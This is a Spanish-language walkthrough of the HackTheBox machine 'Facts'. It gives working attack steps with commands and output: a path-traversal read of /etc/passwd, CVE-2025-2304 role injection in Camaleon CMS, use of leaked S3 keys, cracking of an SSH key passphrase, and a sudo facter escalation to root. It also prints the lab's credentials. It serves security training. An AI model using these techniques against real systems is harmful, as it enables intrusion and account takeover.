# Introducción
Facts es una máquina de dificultad Easy que presenta un entorno diverso, integrando Camaleon CMS, servicios de almacenamiento de objetos (MinIO/S3) y una escalada de privilegios basada en herramientas de gestión de configuración. El reto requiere un flujo de trabajo meticuloso, desde la explotación de vulnerabilidades web hasta el crackeo de llaves criptográficas.

La intrusión inicial se logra creando una cuenta propia en el dashboard y abusando de una vulnerabilidad de Parameter Injection (CVE-2025-2304) en Camaleon CMS. Esta falla permite elevar los privilegios de una cuenta estándar a administrador mediante la manipulación de los parámetros de cambio de contraseña.

Una vez con acceso administrativo, la fase de post-explotación web revela credenciales de AWS S3. Utilizando awscli para interactuar con una instancia local de MinIO, se logra extraer una llave privada SSH protegida por contraseña. Tras un ataque de fuerza bruta con John the Ripper, se obtiene acceso al sistema. Finalmente, la escalada de privilegios a root se realiza mediante el abuso de permisos de Sudo sobre el binario Facter, aprovechando su capacidad para cargar scripts de Ruby personalizados desde directorios arbitrarios.

---

## **Reconocimiento**

Como primer paso, realizamos  un escaneo **Nmap** para enumerar los puertos abiertos y los servicios en ejecución dentro de la máquina y obtenemos el siguiente resultado:

```bash
$ nmap -p- 10.129.35.98 --open  
                             
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-23 02:42 -0400
Nmap scan report for 10.129.35.98
Host is up (0.072s latency).
Not shown: 65182 closed tcp ports (reset), 350 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
54321/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 26.99 seconds
```

Ya sabemos qué puertos están abiertos, es momento de hacer un escaneo exhaustivo:

```bash
$ nmap -p 22,80,54321 -sCV -Pn 10.129.35.98  

Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-23 02:45 -0400
Nmap scan report for 10.129.35.98
Host is up (0.067s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
54321/tcp open  http    Golang net/http server
|_http-title: Did not follow redirect to http://10.129.35.98:9001
|_http-server-header: MinIO
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin

...
```

Como vemos en los resultados, tenemos una página web en el puerto 80  y una instancia de Minio en el puerto 54321.

> MinIO es una solución de almacenamiento de objetos de alto rendimiento, diseñada como software libre (código abierto) y compatible con la API de Amazon S3.
> 

La página web corriendo en el puerto 80 está haciendo uso del nombre de dominio facts.htb, así que debemos añadirlo al archivo `/etc/hosts` de nuestro sistema:

```bash
$ sudo echo "10.129.35.98 facts.htb" >> /etc/hosts
```

Una vez accedemos a la página, vemos que no hay nada interesante:

![1](https://github.com/vonoHC/Writeups/blob/main/HackTheBox/Facts/Capturas/1.png)

Hagamos una enumeración de directorios con Ffuf para ver qué hallamos:

```bash
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://facts.htb/FUZZ -fw 1328 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://facts.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1328
________________________________________________

400                     [Status: 200, Size: 6685, Words: 993, Lines: 115, Duration: 2224ms]
404                     [Status: 200, Size: 4836, Words: 832, Lines: 115, Duration: 2212ms]
500                     [Status: 200, Size: 7918, Words: 1035, Lines: 115, Duration: 2419ms]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2200ms]
admin.pl                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1966ms]
admin.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2012ms]
admin.cgi               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2090ms]
ajax                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2117ms]
captcha                 [Status: 200, Size: 1086, Words: 5, Lines: 7, Duration: 3797ms]

...
```

Vemos que existe el directorio /admin, y que al dirigirnos a él nos encontramos con un panel de inicio de sesión, el cual nos permite crear una nueva cuenta y posteriormente iniciar sesión:

![2](https://github.com/vonoHC/Writeups/blob/main/HackTheBox/Facts/Capturas/2.png)

![3](https://github.com/vonoHC/Writeups/blob/main/HackTheBox/Facts/Capturas/3.png)

![4](https://github.com/vonoHC/Writeups/blob/main/HackTheBox/Facts/Capturas/4.png)

---

## Explotación

Al probar si el servidor es vulnerable a Local File Inclusion (LFI) ingresando la siguiente solicitud en la barra de búsqueda:

```bash
http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
```

Obtenemos el archivo passwd, el cual lista los usuarios existentes en el sistema. Esto será un recurso importante para el futuro.

### /etc/passwd

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```

Recolectando información del sitio, vemos que este está motorizado por Camaleon CMS versión 2.9.0, el cual es vulnerable a CVE-2025-2304, una vulnerabilidad en el sistema que permite aumentar los privilegios de nuestra cuenta a través de la inyección de parámetros en la solicitud de cambio de contraseña.

Aquí están los pasos para explotar esta vulnerabilidad de forma manual:

1. Dirigirse a la sección de perfil de cuenta y presionar el botón para cambiar la contraseña:

![5](https://github.com/vonoHC/Writeups/blob/main/HackTheBox/Facts/Capturas/5.png)

1. Interceptar la solicitud del cambio de contraseña con Buirp Suite:

![6](https://github.com/vonoHC/Writeups/blob/main/HackTheBox/Facts/Capturas/6.png)

1. Agregar el siguiente parámetro al final de la solicitud POST:

```bash
&password[role]=admin
```

![7](https://github.com/vonoHC/Writeups/blob/main/HackTheBox/Facts/Capturas/7.png)

Una vez hayamos reenviado la solicitud y refrescado la página, nuestra cuenta tendrá el rol de admin:

![8](https://github.com/vonoHC/Writeups/blob/main/HackTheBox/Facts/Capturas/8.png)

Navegando más como administrador a través de la web, encontramos información de acceso para AWS S3.

> Amazon S3 (Simple Storage Service) es un servicio de almacenamiento de objetos en la nube, gestionado por AWS, diseñado para guardar cualquier cantidad de datos de forma segura, duradera y escalable.
> 

![9](https://github.com/vonoHC/Writeups/blob/main/HackTheBox/Facts/Capturas/9.png)

Vamos a hacer uso de la herramienta oficial aws cli para acceder a esta instancia de S3 en el objetivo:

Como primer paso, debemos configurar un perfil de acceso a AWS con la información obtenida, usando el siguiente comando:

```bash
$ aws configure --profile facts                                                                       

AWS Access Key ID [None]: AKIAAE45527849FDE323
AWS Secret Access Key [None]: Msee3L2wSmRjfdTykhJlb4IjhVWzP1Hqcff79djm
Default region name [None]: us-east-1
Default output format [None]: json

```

Ahora procedemos a listar los buckets de la instancia con el siguiente comando:

```bash
$ aws s3 ls --endpoint-url  http://10.129.35.98:54321   --profile facts 

2025-09-11 08:06:52 internal
2025-09-11 08:06:52 randomfacts
```

> Un S3 Bucket (cubeta) **es un contenedor fundamental en [Amazon Simple Storage Service (S3)](https://docs.aws.amazon.com/es_es/AmazonS3/latest/userguide/Welcome.html) utilizado para almacenar datos como objetos (archivos) de cualquier tipo (imágenes, vídeos, copias de seguridad) en la nube de AWS.**
> 

Luego de explorar ambos buckets, hallamos una clave privada para ssh en /internal/.ssh/, la cual podemos descargar con el siguiente comando:

```bash
$ aws s3 cp s3://internal/.ssh/id_ed25519 --endpoint-url  http://10.129.35.98:54321 . --profile facts 

download: s3://internal/.ssh/id_ed25519 to ./id_ed25519 
```

Al intentar conectarnos a través de SSH a la máquina objetivo con el usuario trivia, vemos que la clave privada tiene una contraseña de acceso, así que no nos sirve por sí sola:

```bash
$ ssh trivia@10.129.35.98 -i id_ed25519

Enter passphrase for key 'id_ed25519': 
```

Intentemos conseguir la clave de acceso, crackeando la contraseña con JohnTheRipper:

1. Convertimos la clave privada a un formato manejable para JohnTheRipper, con la herramienta ssh2john:

```bash
$ ssh2john id_ed25519 > hash.txt

$ cat id_ed25519

id_ed25519:$sshng$6$16$0a654c38c10302a00fd9cc2c9539c5cc$290$6f70656e7373682d6b65792d
l7631000000000a6165733235362d6374720000000662637279707400000018000000100a654c38c1030
2a00fd9cc2c9539c5cc0000001800000001000000330000000b7373682d65643235353139000000203ca
03cc5f399ddce9aa316f078c37988334d05a7c855ac16f08490b5877822cb000000a009bbe019af89acf
c5f2ee08ce05f2792fdea608e52cfea10c9474b1893fa473cb774321b7b95afd7c9e0296a75a08f6d3c7
74d6dc3762fcf77701fa856b7a055515fb11fddce3aaa479b33613374dc00a226542385e1327a49a1de3
0fa3cbcf9341ebf35e1a5390f9d897a90cce8d978270cb3453f22cff507afcfd89bc4477eebc836ac1b8
5f66ba83c3c7af4817d3fa1cbc2c35686418e859e07f85c175d85$24$130
```

1. Hacemos un ataque de fuerza bruta para adivinar la contraseña:

```bash
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt    
      
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (id_ed25519)     
1g 0:00:03:14 DONE (2026-04-23 10:34) 0.005144g/s 16.46p/s 16.46c/s 16.46C/s grecia..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Ya teniendo todas las credenciales de acceso requeridas, podemos iniciar sesion a traves de SSH:

```bash
$ ssh trivia@10.129.35.98 -i id_ed25519

Enter passphrase for key 'id_ed25519': dragonballz
Last login: Thu Apr 23 14:39:37 UTC 2026 from 10.10.15.157 on ssh
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Apr 23 02:39:37 PM UTC 2026

  System load:           0.04
  Usage of /:            71.9% of 7.28GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             221
  Users logged in:       1
  IPv4 address for eth0: 10.129.35.98
  IPv6 address for eth0: dead:beef::250:56ff:feb0:2f6a

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings

trivia@facts:~$ 

```

La user flag se encuentra en /home/william.

---

## Post-Explotación/Escalada de privilegios

Al listar los comandos ejecutables como sudo, encontramos facter:

```bash
trivia@facts:~$ sudo -l

Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter

```

> [Facter](https://www.google.com/search?q=Facter&oq=que+es+facter&gs_lcrp=EgZjaHJvbWUqCAgAEEUYJxg7MggIABBFGCcYOzIGCAEQRRg5MgkIAhAAGA0YgAQyCQgDEAAYDRiABDIJCAQQABgNGIAEMgkIBRAAGA0YgAQyCQgGEAAYDRiABDIJCAcQABgNGIAEMgkICBAAGA0YgAQyCQgJEAAYDRiABNIBCDI1NThqMGo5qAIGsAIB8QVEe02FLkR5zg&sourceid=chrome&ie=UTF-8&mstk=AUtExfAQegddhpaUuwrJqw-h_bnZkAC9xiijXl-lKLid3guJXK-FVI0Gu2MtIvzm0ckNpA0TiS1WZKadCZJCWdWZ4zvjMjom5JiElmFA7Xg4FIVwXnn0g3TAvG6n04C6shAPsA-aUOimSDOuPvNibwb2HG0er8otYMoUru4d8_q9_r0Y8JY&csui=3&ved=2ahUKEwjKlYKhmoSUAxVzQTABHUR5DEwQgK4QegQIARAB) es una **herramienta de línea de comandos multiplataforma, escrita en Ruby y desarrollada por [Puppet](https://github.com/puppetlabs/facter), que recopila información detallada del sistema (llamados "facts") sobre hardware, red, sistema operativo y configuración**.
> 

Haciendo una búsqueda en [GTFOBins](https://gtfobins.org/), vemos que una función de facter permite ejecutar el primer archivo .rb dentro del directorio que le indiquemos. Esto lo podríamos usar para obtener una shell como root:

![10](https://github.com/vonoHC/Writeups/blob/main/HackTheBox/Facts/Capturas/10.png)

Sabiendo esto, para escalar privilegios lo primero que haremos será crear un script en Ruby dentro del directorio personal de trivia, el cual contendrá el comando que nos dará la terminal como root:

```bash
trivia@facts:~$ echo "exec('/bin/bash')" > root.rb
```

Ahora solo quedaría ejecutar facter como sudo e indicarle el directorio en el que se encuentra el script:

```bash
trivia@facts:~$ sudo facter --custom-dir=/home/trivia/
root@facts:/home/trivia# id
uid=0(root) gid=0(root) groups=0(root)

```

**¡Y con esto habremos hecho nuestro el sistema de Facts!**
![Pwned!](https://github.com/vonoHC/Writeups/blob/main/HackTheBox/Facts/Capturas/11.png)
